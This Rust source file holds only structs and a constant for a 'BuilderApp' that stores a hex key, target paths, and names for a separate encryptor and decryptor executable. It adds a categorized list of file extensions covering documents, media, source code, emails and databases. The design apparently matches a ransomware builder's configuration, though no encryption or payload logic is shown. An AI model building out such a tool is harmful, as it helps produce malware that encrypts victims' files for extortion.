use serde::{Deserialize, Serialize};

#[derive(Clone)]
pub struct PathEntry {
	pub path: String,
	pub is_file: bool,
}

#[derive(Clone)]
pub struct LogEntry {
	pub timestamp: String,
	pub message: String,
	pub is_error: bool,
}

pub struct BuilderApp {
	pub key_hex: String,
	pub paths: Vec<PathEntry>,
	pub mode: String,
	pub status: String,
	pub new_path: String,
	pub logs: Vec<LogEntry>,
	pub encrypt_exe_name: String,
	pub decrypt_exe_name: String,
	pub extensions: Vec<FileExtension>,
	pub use_custom_extensions: bool,
	pub custom_extensions_input: String,
	pub select_all_categories: bool,
	pub open_categories: Vec<String>
}

#[derive(Serialize, Deserialize)]
pub struct Config {
	pub key: String,
	pub paths: Vec<String>,
	pub mode: String,
	pub encrypt_extensions_only: bool,
}

#[derive(Debug, Clone, serde::Deserialize, serde::Serialize)]
pub struct FileExtension {
	pub name: String,
	pub enabled: bool,
	pub category: String,
}

pub const EXTENSIONS: &[(&str, &[&str])] = &[
	("📄 Documents", &[
		"txt", "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "ods", "odp", "rtf", "md",
		"tex", "log", "csv", "xml", "json", "yml", "yaml", "toml"
	]),
	("🖼️ Images", &[
		"jpg", "jpeg", "png", "gif", "bmp", "tiff", "webp", "svg", "ico", "raw", "cr2", "nef", "arw"
	]),
	("🎥 Videos", &[
		"mp4", "avi", "mkv", "mov", "wmv", "flv", "webm", "m4v", "mpg", "mpeg", "3gp", "ts", "mts"
	]),
	("🎵 Audio", &[
		"mp3", "wav", "flac", "aac", "ogg", "m4a", "wma", "opus", "amr"
	]),
	("🗜️ Archives", &[
		"zip", "rar", "7z", "tar", "gz", "bz2", "xz", "iso", "dmg", "cab"
	]),
	("💻 Source Code", &[
		"rs", "go", "py", "js", "ts", "jsx", "tsx", "html", "css", "scss", "sass",
		"c", "cpp", "h", "hpp", "java", "kt", "swift", "php", "rb", "pl", "lua",
		"sql", "sh", "bat", "ps1", "dockerfile", "makefile", "toml", "json", "yml"
	]),
	("📧 Emails", &[
		"eml", "msg", "pst", "ost"
	]),
	("📊 Databases", &[
		"db", "sqlite", "sqlite3", "mdb", "accdb", "sql", "bak"
	]),
];